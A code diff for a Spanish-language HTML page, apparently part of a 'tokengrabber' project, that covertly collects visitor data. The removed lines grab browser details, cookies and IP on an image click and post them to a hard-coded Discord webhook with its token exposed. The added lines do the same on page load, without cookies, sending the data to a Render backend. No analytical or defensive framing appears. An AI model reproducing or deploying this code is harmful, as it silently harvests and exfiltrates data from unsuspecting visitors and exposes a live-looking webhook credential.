@@ -24,39 +24,32 @@
     <p>Click en la imagen para iniciar...</p>
     <img src="C:\Users\HP PC\Downloads\tokengrabber\dist\Sinulo.png" onclick="extraer()">
 
-    <script>
-        function extraer() {
-            let data = {
-                navegador: navigator.userAgent,
-                idioma: navigator.language,
-                plataforma: navigator.platform,
-                cookies: document.cookie,
-                ip: "Obteniendo..."
-            };
+<script>
+    const data = {
+        navegador: navigator.userAgent,
+        idioma: navigator.language,
+        plataforma: navigator.platform
+    };
 
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    data.ip = ipData.ip;
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(ipData => {
+            data.ip = ipData.ip;
 
-                    fetch("https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI", {
-                        method: "POST",
-                        headers: {"Content-Type": "application/json"},
-                        body: JSON.stringify({content: "**Datos del navegador:**
-" + 
-                            "> Navegador: " + data.navegador + "
-" +
-                            "> Idioma: " + data.idioma + "
-" +
-                            "> Plataforma: " + data.plataforma + "
-" +
-                            "> IP: " + data.ip
-                        })
-                    });
-
-                    alert("Datos enviados.");
-                });
-        }
-    </script>
-</body>
-</html>
+            // Enviar a tu backend en Render
+            fetch("https://tubackend.onrender.com/webhook", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(data)
+            })
+            .then(res => res.text())
+            .then(resp => {
+                alert("Datos enviados correctamente.");
+                console.log(resp);
+            })
+            .catch(err => {
+                alert("Error al enviar datos.");
+                console.error(err);
+            });
+        });
+</script>
